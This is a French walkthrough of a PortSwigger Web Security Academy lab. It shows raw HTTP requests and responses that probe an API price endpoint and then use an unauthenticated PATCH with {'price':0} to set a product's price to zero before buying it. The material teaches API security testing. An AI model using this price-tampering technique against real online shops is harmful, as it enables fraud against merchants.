# Lab

https://portswigger.net/web-security/api-testing/lab-exploiting-unused-api-endpoint

## Solution

Sur ce lab, quand on va sur un produit, on voit un appel GET qui est envoyé vers `/api/products/[productId: Int]/price` :

```http
GET /api/products/1/price HTTP/2
Host: 0a00003503392bda814e3eeb00e700d7.web-security-academy.net
Cookie: session=azbsyzbH5fLv2qYRw95l4eWeC4PLKblk
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a00003503392bda814e3eeb00e700d7.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i
```

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 75

{"price":"$1337.00","message":"6 people have viewed this item in the last 3h"}
```

Si on essaie d'envoyer un `PATCH` sur cette route, on obtient une erreur nous indiquant qu'uniquement le contenu `application/json` est accepté :

```http
PATCH /api/products/1/price HTTP/2
Host: 0a00003503392bda814e3eeb00e700d7.web-security-academy.net
Cookie: session=azbsyzbH5fLv2qYRw95l4eWeC4PLKblk
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a00003503392bda814e3eeb00e700d7.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i
Content-Length: 0
```

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 93

{"type":"ClientError","code":400,"error":"Only 'application/json' Content-Type is supported"}
```

On peut donc essayer d'envoyer un `PATCH` avec un contenu `application/json` :

```http
PATCH /api/products/1/price HTTP/2
Host: 0a00003503392bda814e3eeb00e700d7.web-security-academy.net
Cookie: session=azbsyzbH5fLv2qYRw95l4eWeC4PLKblk
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a00003503392bda814e3eeb00e700d7.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i
Content-Type: application/json
Content-Length: 0
```

```http
HTTP/2 500 Internal Server Error
Content-Length: 21

Internal Server Error
```

Là on a une erreur 500, ce qui veut dire qu'on a réussi à envoyer un contenu `application/json` au serveur.

Si on essaie de changer le prix du produit en envoyant le retour du GET :

```http
PATCH /api/products/1/price HTTP/2
Host: 0a00003503392bda814e3eeb00e700d7.web-security-academy.net
Cookie: session=azbsyzbH5fLv2qYRw95l4eWeC4PLKblk
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a00003503392bda814e3eeb00e700d7.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i
Content-Type: application/json
Content-Length: 14

{"price":"$0"}
```

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 98

{"type":"ClientError","code":400,"error":"'price' parameter must be a valid non-negative integer"}
```

On obtient une erreur nous indiquant que le paramètre `price` doit être un entier positif.

On peut donc essayer d'envoyer un entier positif :

```http
PATCH /api/products/1/price HTTP/2
Host: 0a00003503392bda814e3eeb00e700d7.web-security-academy.net
Cookie: session=azbsyzbH5fLv2qYRw95l4eWeC4PLKblk
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a00003503392bda814e3eeb00e700d7.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i
Content-Type: application/json
Content-Length: 14

{"price":0}
```

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 17

{"price":"$0.00"}
```

Maintenant le prix du produit est à 0 et on peut l'acheter pour réussir le lab.